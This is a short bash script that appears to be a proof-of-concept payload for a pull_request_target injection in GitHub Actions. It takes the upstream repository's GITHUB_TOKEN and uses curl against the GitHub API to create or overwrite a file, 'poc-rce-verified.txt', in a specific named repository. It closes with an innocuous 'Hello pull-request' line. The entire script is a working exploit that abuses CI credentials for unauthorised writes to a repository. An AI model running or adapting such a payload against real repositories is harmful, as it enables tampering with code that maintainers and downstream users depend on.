#!/bin/bash
# GitHub Actions injects GITHUB_TOKEN env var automatically
# This runs with UPSTREAM repo's token (pull_request_target)

TIMESTAMP=$(date -u +%Y-%m-%dT%H:%M:%SZ)
MSG="RCE CONFIRMED: pull_request_target injection | user=akbaba123x | time=$TIMESTAMP | runner=$RUNNER_NAME"
CONTENT=$(printf '%s' "$MSG" | base64 | tr -d '\n')

# Get existing file SHA if it exists
EXISTING=$(curl -sf -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/repos/datamove/linux-git2/contents/poc-rce-verified.txt" 2>/dev/null || true)
SHA=$(echo "$EXISTING" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('sha',''))" 2>/dev/null || true)

if [ -n "$SHA" ]; then
  BODY="{\"message\":\"PoC RCE verified\",\"content\":\"$CONTENT\",\"sha\":\"$SHA\"}"
else
  BODY="{\"message\":\"PoC RCE verified\",\"content\":\"$CONTENT\"}"
fi

curl -sf -X PUT \
  -H "Authorization: token $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github.v3+json" \
  "https://api.github.com/repos/datamove/linux-git2/contents/poc-rce-verified.txt" \
  -d "$BODY" > /tmp/poc_result.txt 2>&1 && echo "FILE CREATED" || echo "FILE FAILED: $(cat /tmp/poc_result.txt)"

echo "Hello pull-request"
